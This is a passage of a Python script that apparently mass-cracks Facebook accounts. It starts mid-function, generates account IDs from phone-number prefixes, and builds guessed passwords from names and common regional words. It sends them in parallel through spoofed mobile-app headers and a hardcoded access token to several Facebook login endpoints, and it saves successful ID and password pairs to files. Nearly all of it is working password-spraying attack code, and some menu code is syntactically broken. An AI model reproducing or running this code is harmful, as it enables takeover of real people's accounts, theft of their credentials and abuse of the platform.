		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			TRT=session.cookies.get_dict().keys()
			if "c_user" in TRT:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TRT:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#method6
#d.fb
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TRT-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			TRT=session.cookies.get_dict().keys()
			if "c_user" in TRT:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TRT:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#method7
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TRT-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			TRT=session.cookies.get_dict().keys()
			if "c_user" in TRT:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TRT:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
				
def afghan():
	clear()
			print(' [1] RANDOM CLONING V1\n[2] RANDOM CLONEING V2')
			xd=input(' CHOOSE : ')
			if xd in ['1','01']:
				CRACKafghan()
			if xd in ['02,'2']:
				CRACKafghan1()
				
def CRACKafghan():
		user=[]
		clear()
		print('\033[1;33m             079, 070, 074, 077, 078')
		
		code = input('\033[1;37mPUT CODE : ')
		try:
			limit = int(input('\033[1;37mEXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37mLIMIT: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;37m [1] \033[1;37mJOIN OUR GROUP')
		os.system('xdg-open https://chat.whatsapp.com/EqiB2gzpCCV1jJyd1HdXEQ/')
		print('\033[1;37m____________________________________________________')
		mthd = input(' CHOOSE: ')
		clear()
		print('\033[1;32m [1] \033[1;31mJOIN YOUTUBE  CHANNEL FOR SCRIPT UPDATE')
		os.system('xdg-open   https://www.youtube.com/@Techsilent674')
		print('\033[1;37m____________________________________________________')
		pcs = input(' [?] SELECT : ')
		
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as CRACK:	
			clear()
			tl = str(len(user))
			print(' TOTAL IDS : \033[1;33m'+tl+f' ')
			print(f'\033[1;34m CHOICE CODE  :\033[1;32m '+code)
			print(' \033[1;35mON/OFF YOUR MOBILE DATA BEFORE USE')
			print('\033[1;37m____________________________________________________')
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'khankhan','khan12345','khan123','khanbaba','786786','100200','10002000','pubgking','pubg123','Pakistan']
				if mthd in ['1','01']:
					CRACK.submit(rndm,ids,passlist)
		print('\033[1;37m')
		print('\033[1;37m____________________________________________________')
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		print('\033[1;37m____________________________________________________')
		input(' Press enter to back ')
		os.system('python CRACK.py')
		
def CRACKafghan1():
		user=[]
		clear()
		print('\033[1;33m             9377, 070, 074, 077, 078')
		
		code = input('\033[1;35mPUT CODE: ')
		try:
			limit = int(input('\033[1;31mEXAMPLE: 2000, 3000, 5000, 10000\n\033[1;37mLIMIT: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;37m [1] \033[1;37mJOIN OUR GROUP')
		os.system('xdg-open https://chat.whatsapp.com/EqiB2gzpCCV1jJyd1HdXEQ/')
		print('\033[1;37m____________________________________________________')
		mthd = input(' CHOOSE: ')
		clear()
		print('\033[1;32m [1] \033[1;31mJOIN YouTube CHANNEL')
		os.system('xdg-open   https://www.youtube.com/@Techsilent674')
		print('\033[1;37m____________________________________________________')
		pcs = input(' [?] SELECT: ')
		
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as CRACK:	
			clear()
			tl = str(len(user))
			print(' TOTAL IDS : \033[1;33m'+tl+f' ')
			print(f'\033[1;34m CHOICE CODE  :\033[1;32m '+code)
			print(' \033[1;35mON/OFF YOUR MOBILE DATA BEFORE USE')
			print('\033[1;37m____________________________________________________')
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰','Afghan1234','kabul1234','Kabul123','Kabul1234']
				if mthd in ['1','01']:
					CRACK.submit(rndm2,ids,passlist)
		print('\033[1;37m')
		print('\033[1;37m____________________________________________________')
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		print('\033[1;37m____________________________________________________')
		input(' Press enter to back ')
		os.system('python Random.py')
enCRACK1 = ['en_GB','en_US']
CRACKfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
CRACKsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat']
modelxxx = ['X677','F98', 'NOTE 2 LTE', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 PRO', 'Hot 10', 'Hot 10 Play', 'Note 4', 'Note 4 Pro', 'Hot 10s', 'Note 5', 'Note 10s NFC', 'Note 5 Stylus', 'Note 6', 'Note 7 LTE', 'Note 7', 'Note 7 Lite', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 Play', 'Hot 12 Play NFC', 'HOT','Note 12 Pro 5G', 'Hot 5', 'Hot 5 Pro', 'Hot 5 NFC', 'Hot 5 LTE', 'Hot 5 Lite', 'Hot 6', 'Hot 6 Pro', 'Hot 6 Lite', 'Hot 6 LTE', 'Hot 6 NFC', 'Hot 7', 'Hot 7 Lite', 'Hot 7 NFC', 'Hot 7 LTE', 'Hot 8', 'Hot 8 Pro', 'Hot 8 NFC', 'Hot 8 LTE', ' Hot 9', 'Hot 9 Pro', 'Hot 9 LTE', ' Hot 9 Lite', 'Hot 9 NFC']
scmodel = ['SC-04A', 'SC-01A', 'SC-02A', 'SC-03A', 'SC-05A', 'SC-06A', 'SC-07A', 'SC-08A', 'SC-09A', 'SC-04B', 'SC-01B', 'SC-02B', 'SC-03B', 'SC-05B', 'SC-06B', 'SC-07B', 'SC-08B', 'SC-09B', 'SC-04C', 'SC-01C', 'SC-02C', 'SC-03C', 'SC-05C', 'SC-06C', 'SC-07C', 'SC-08C', 'SC-09C', 'SC-04D', 'SC-01D', 'SC-02D', 'SC-03D', 'SC-05D', 'SC-06D', 'SC-07D', 'SC-08D', 'SC-09D', 'SC-04E', 'SC-01E', 'SC-02E', 'SC-03E', 'SC-05E', 'SC-06E', 'SC-07E', 'SC-08E', 'SC-09E', 'SC-04F', 'SC-01F', 'SC-02F', 'SC-03F', 'SC-05F', 'SC-06F', 'SC-07F', 'SC-08F', 'SC-09F', 'SC-04G', 'SC-01G', 'SC-02G', 'SC-03G', 'SC-05G', 'SC-06G', 'SC-07G', 'SC-08G', 'SC-09G', 'SC-04H', 'SC-01H', 'SC-02H', 'SC-03H', 'SC-05H', 'SC-06H', 'SC-07H', 'SC-08H', 'SC-09H', 'SC-04I', 'SC-01I', 'SC-02I', 'SC-03I', 'SC-05I', 'SC-06I', 'SC-07I', 'SC-08I', 'SC-09I', 'SC-04J', 'SC-01J', 'SC-02J', 'SC-03J', 'SC-05J', 'SC-06J', 'SC-07J', 'SC-08J', 'SC-09J', 'SC-04K', 'SC-01K', 'SC-02K', 'SC-03K', 'SC-05K', 'SC-06K', 'SC-07K', 'SC-08K', 'SC-09K', 'SC-04L', 'SC-01L', 'SC-02L', 'SC-03L', 'SC-05L', 'SC-06L', 'SC-07L', 'SC-08L', 'SC-09L', 'SC-04M', 'SC-01M', 'SC-02M', 'SC-03M', 'SC-05M', 'SC-06M', 'SC-07M', 'SC-08M', 'SC-09M', 'SC-04N', 'SC-01N', 'SC-02N', 'SC-03N', 'SC-05N', 'SC-06N', 'SC-07N', 'SC-08N', 'SC-09N', 'SC-04O', 'SC-01O', 'SC-02O', 'SC-03O', 'SC-05O', 'SC-06O', 'SC-07O', 'SC-08O', 'SC-09O', 'SC-04Q', 'SC-01Q', 'SC-02Q', 'SC-03Q', 'SC-05Q', 'SC-06Q', 'SC-07Q', 'SC-08Q', 'SC-09Q', 'SC-04S', 'SC-01S', 'SC-02S', 'SC-03S', 'SC-05S', 'SC-06S', 'SC-07S', 'SC-08S', 'SC-09S', 'SC-04Y', 'SC-01Y', 'SC-02Y', 'SC-03Y', 'SC-05Y', 'SC-06Y', 'SC-07Y', 'SC-08Y', 'SC-09Y', 'SC-04Z', 'SC-01Z', 'SC-02Z', 'SC-03Z', 'SC-05Z', 'SC-06Z', 'SC-07Z', 'SC-08Z', 'SC-09Z', ]
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [CRACK-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                CRACKsim = random.choice(CRACKsim1)
                                gtt=random.choice(modelxxx)
                                enCRACK=random.choice(enCRACK1)
                                CRACKfban=random.choice(CRACKfban1)
                                gttt=random.choice(modelxxx)
                                android_version=str(random.randrange(6,13))
                                CRACK_ua = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gttt)} Build/{str(gtt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,height=1024,width=2048};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(CRACKsim)};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'machine_id':machine_id,
                                'generate_machine_id':'1',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                head ={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": 'unknown',
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),
                                "X-FB-Net-HNI": str(random.randint(2e4, 4e4)),
                                'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-connection-quality':'EXCELLENT',
                                'X-FB-device-group': '5120',
                                'x-fb-session-id':'Unid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
                                'User-Agent':CRACK_ua,   
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                "X-FB-Client-IP": "True",
                                "X-Tigon-Is-Retry": "False",
                                "X-FB-Server-Cluster": "True",
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/CRACK-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [CRACK-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/CRACK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [CRACK-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CRACK-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [CRACK-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,777))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,777))
                                application_version_code=str(random.randint(000000000,777777777))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                CRACKsim = random.choice(CRACKsim1)
                                gtt=random.choice(scmodel)
                                enCRACK=random.choice(enCRACK1)
                                CRACKfban=random.choice(CRACKfban1)
                                gttt=random.choice(scmodel) 
                                android_version=str(random.randrange(6,13))
                                mirwais = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/str(random.randint(000000000,999999999));FBCR/Etisalat;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 11 Pro;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'try_num':'1',
                                'credentials_type':'password',
                                'community_id':'',
                                'secure_family_device_id':'',
                                'cpl':'true',
                                'currently_logged_in_userid':'0',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'machine_id':machine_id,
                                'meta_inf_fbmeta':'NO_FILE',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                head={     
                                "X-FB-Connection-Type": 'MOBILE.LTE',
                                'x-fb-connection-quality':'EXCELLENT',
                                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                                'X-FB-device-group': str(random.randint(2e7,3e7)),
                                "X-FB-Friendly-Name": "authenticate",
                                "X-FB-Friendly-Name": "ViewerReactionsMutation",                 
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": mirwais,
                                'x-fb-rmd':'cached=0;state=NO_MATCH',
                                'x-fb-request-analytics-tags':'unknown',
                                "Connection": "Close",
                                "Accept-Encoding": "gzip, deflate",
                                "X-FB-Server-Cluster": "True",
                                "X-Tigon-Is-Retry": "False",
                                "X-FB-Client-IP": "True",
                                 'X-FB-HTTP-Engine': 'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/CRACK-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [CRACK-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/CRACK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [CRACK-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CRACK-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
                
try:
	menu()
except requests.exceptions.ConnectionError:
	print('No internet connection ...')
	exit()
except:exit()
